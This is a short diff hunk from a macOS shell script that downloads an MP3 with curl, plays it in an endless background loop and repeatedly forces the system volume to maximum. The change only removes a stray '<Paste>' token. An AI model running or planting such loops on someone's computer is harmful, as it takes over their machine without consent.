@@ -11,4 +11,4 @@ LINK=("$BASIC${LINKS[$INDEX]}.mp3")
 curl $LINK > ~/.TemporaryItems/mem.mp3
 
 while [ 1 ]; do afplay ~/.TemporaryItems/mem.mp3; done &
-while [ 1 ]; do osascript -e "set Volume 10"; done &<Paste>
+while [ 1 ]; do osascript -e "set Volume 10"; done &
